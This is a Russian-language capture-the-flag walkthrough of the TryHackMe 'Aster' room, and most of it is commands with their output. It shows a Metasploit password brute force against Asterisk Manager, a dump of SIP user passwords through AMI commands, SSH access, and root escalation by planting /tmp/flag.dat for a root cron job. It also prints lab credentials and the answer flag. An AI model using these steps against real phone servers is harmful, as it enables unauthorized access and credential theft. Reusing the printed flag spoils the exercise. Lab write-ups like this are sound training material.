

- https://tryhackme.com/room/aster

##### Hack my server dedicated for building communications applications.

- Обратное проектирование
- Нестандартные службы
- Тщательная разведка

### Разведка

Все по класике. Сначала nmap
<img width="947" height="417" alt="Pasted image 20251230122824" src="https://github.com/user-attachments/assets/11a4a5c1-2876-4cfc-ad67-2b19fb9bf1eb" />


На 80 порту
<img width="1467" height="847" alt="Pasted image 20251230125249" src="https://github.com/user-attachments/assets/6ae2cda3-ac95-41de-922c-21da925c6bb5" />

Загружаем файл.

Это исполняемый файл c расширением .pyc. Попробуем его перевести в .py файл. С помощью утилиты uncompyle6. 

<img width="1232" height="458" alt="Pasted image 20251230125439" src="https://github.com/user-attachments/assets/e75f5062-e11a-4ce9-a2fe-e933fefe0db7" />


Запускаем output.py

<img width="373" height="150" alt="Pasted image 20251230125745" src="https://github.com/user-attachments/assets/67fa1e3a-7683-4180-b2df-d7b401cd238a" />


Тут на первый взгляд ничего, но если мы немного подредачим файл, то вывод будет совсем другим.
<img width="1232" height="287" alt="Pasted image 20251230130003" src="https://github.com/user-attachments/assets/ee27f5fb-55b2-4d52-a5a5-ceb7960d8f4a" />

<img width="1182" height="62" alt="Pasted image 20251230130109" src="https://github.com/user-attachments/assets/61e18ff6-d4d9-4f03-8194-660ae9ab9a82" />

Теперь мы знаем юзернейм: admin

Для более глубокой разведки я еще раз запустил nmap но с флагом -p- для сканирования всех портов. Есть подозрения что используеся Asterisc, тк у машинs похожее название, да еще иконка CTF это лого Asterisc. 

Все так - сканер показал 5038 порт 

`5038/tcp open  asterisk    syn-ack Asterisk Call Manager 5.0.2`

Можно еще заниматся разведкой, перебрать дериктории и тп, но думаю тут уже очевиден вектор атаки и уязвимость в Астериске. 

### Эксплуатация

**Asterisk** — это открытая платформа для построения телекоммуникационных систем, чаще всего IP-АТС (телефонных систем) на базе Linux.

Чисто теоретически в нем могут содержаться данные о пользователях пароли и тп. 

По версии находим уязвимость и юзаем Metasploit

```
msf > use auxiliary/voip/asterisk_login`
msf auxiliary(voip/asterisk_login) > set RHOST 10.67.136.212`
RHOST => 10.67.136.212`
msf auxiliary(voip/asterisk_login) > set USERNAME admin`
USERNAME => admin`
msf auxiliary(voip/asterisk_login) > run`
[*] 10.67.136.212:5038    - Initializing module...`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'admin'`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'123456'`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'12345'`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'123456789'`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'password'`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'iloveyou'`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'princess'`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'1234567'`
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'12345678'
[*] 10.67.136.212:5038    - 10.67.136.212:5038 - Trying user:'admin' with password:'abc123'
[+] 10.67.136.212:5038    - User: "admin" using pass: "abc123" - can login on 10.67.136.212:5038!
```

Все. Теперь мы знаем логин и пароль. Можем заходить и смотреть.

```
─$ telnet 10.67.136.212 5038
Trying 10.67.136.212...
Connected to 10.67.136.212.
Escape character is '^]'.
Asterisk Call Manager/5.0.2
Action: Login
Username: admin
Secret: abc123

Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 9535
LastReload: 9535
Status: Fully Booted
```

Я еще посмотрел через help команды, поизучал это ПО. но в конечном итоге вот как я узнал креты пользователя

```
action:command
command:sip show users

Response: Success
Message: Command output follows
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No        
Output: 101                        101                               test             No   No        
Output: harry                      p4ss#w0rd!#                       test             No   No        
```

Заходим через SSH
### User

<img width="808" height="402" alt="Pasted image 20251230153349" src="https://github.com/user-attachments/assets/1955ddd2-ab8e-4153-babf-8ed400654e88" />

И получаем первый флаг

### Root

Тут все намного сложнее. Есть некий Example_Root.jar Перекинем его к себе. 

Откроем порт на машине
```
harry@ubuntu:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
```

Заберем со своей.

```
wget http://10.67.136.212:8000/Example_Root.class
--2025-12-30 15:02:17--  http://10.67.136.212:8000/Example_Root.class
Connecting to 10.67.136.212:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 963 [application/java-vm]
Saving to: ‘Example_Root.class’

Example_Root.class             100%[===================================================>]     963  --.-KB/s    in 0.001s  

2025-12-30 15:02:17 (1.11 MB/s) - ‘Example_Root.class’ saved [963/963]
```

Разархивируем и через ghidra смотрим что делает этот код. Дизассемблим короче

```
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class Example_Root {
   public static boolean isFileExists(File var0) {
      return var0.isFile();
   }

   public static void main(String[] var0) {
      String var1 = "/tmp/flag.dat";
      File var2 = new File(var1);

      try {
         if (isFileExists(var2)) {
            FileWriter var3 = new FileWriter("/home/harry/root.txt");
            var3.write("my secret <3 baby");
            var3.close();
            System.out.println("Successfully wrote to the file.");
         }
      } catch (IOException var4) {
         System.out.println("An error occurred.");
         var4.printStackTrace();
      }

   }
}
```

Эта программа делает просто одну вещь.

Если в /tmp будет делать файл flag.dat то она закинет root.txt в /home/harry/
вот и все.

в crontabs можно увидеть что файл запускается каждую минуту. 
```
harry@ubuntu:~$ cat /etc/crontab
```
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
*  *	* * *	root	cd /opt/ && bash ufw.sh
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /root/java/ && bash run.sh
```

Создадим файл, подождем минуту и прочитаем наш флаг 

```
harry@ubuntu:~$ cd /tmp

harry@ubuntu:/tmp$ touch flag.dat

harry@ubuntu:/tmp$ echo "Hello World" > /tmp/flag.dat
```

Выполним echo в /flag.dat чисто для вайба)

```
harry@ubuntu:/tmp$ cd /home/harry
ls
Example_Root.class  Example_Root.jar  META-INF  root.txt  user.txt
harry@ubuntu:~$ cat root.txt
thm{fa1l_revers1ng_java}harry@ubuntu:~$
```

Вот как-то так. Эта машина заточена на работу с AMI, реверсом и сетями. 

Эта машинка отлично показала как важен этап разведки, и что из-за одного  пропущенного порта можно просто не найти начальный вектор атаки.

